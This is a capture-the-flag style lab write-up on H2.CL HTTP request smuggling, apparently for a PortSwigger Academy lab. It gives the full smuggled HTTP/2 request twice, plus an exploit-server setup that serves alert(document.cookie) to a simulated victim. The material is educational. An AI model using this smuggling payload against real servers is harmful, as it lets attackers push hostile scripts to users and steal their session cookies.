# H2.CL Request Smuggling

## Description


This vulnerability occurs when a front-end server downgrades an **HTTP/2** request to **HTTP/1.1** while relying 

on an ambiguous `Content-Length`. As a result, an attacker can smuggle an additional HTTP request that the 

back-end interprets as a separate request.



---


## Goal


Use **H2.CL Request Smuggling** to make the victim load a malicious JavaScript file from the **Exploit Server**, 

which executes:



```javascript

alert(document.cookie)

```


---


## Steps


### 1. Configure the Exploit Server


**File**


```

/resources

```


**Head**


```http

HTTP/1.1 200 OK

Content-Type: application/javascript; charset=utf-8

```


**Body**


```javascript

alert(document.cookie)

```


Click **Store**.


---


### 2. Send the Smuggled Request


```http

POST / HTTP/2

Host: LAB-ID.web-security-academy.net

Content-Length: 0


GET /resources HTTP/1.1

Host: exploit-xxxxxxxx.exploit-server.net

Content-Length: 5


x=1

```


---


### 3. Wait for the Victim


The victim visits the home page every **10 seconds**.


The smuggled request causes the victim to fetch `/resources` from the **Exploit Server** instead of the original 

server, executing:


```javascript

alert(document.cookie)

```


The lab is then solved.


---


## How it Works


1. The front-end receives an HTTP/2 request.

2. It downgrades it to HTTP/1.1.

3. Because of the **H2.CL** vulnerability, the back-end interprets the injected data as a second request.

4. The smuggled request targets the Exploit Server.

5. The victim receives and executes the malicious JavaScript.


---


## Payload


```http

POST / HTTP/2

Host: LAB-ID.web-security-academy.net

Content-Length: 0


GET /resources HTTP/1.1

Host: exploit-xxxxxxxx.exploit-server.net

Content-Length: 5


x=1

```


---


## Key Points


- HTTP/2 is downgraded to HTTP/1.1.

- The vulnerability relies on an ambiguous `Content-Length`.

- No `Transfer-Encoding` header is required.

- The exploit smuggles a second HTTP request.

- The malicious JavaScript is served from the Exploit Server.


---


## References


- https://portswigger.net/web-security/request-smuggling/advanced

- https://portswigger.net/web-security/request-smuggling

````



## Lab Notes



- The malicious JavaScript was hosted at:


```

/resources

```


- The response configured on the Exploit Server was:


```http

HTTP/1.1 200 OK

Content-Type: application/javascript; charset=utf-8

```


- The body contained:


```javascript

alert(document.cookie)

```


- A `302` redirect to the exploit server confirmed that the smuggled request was being processed by the back-end.

````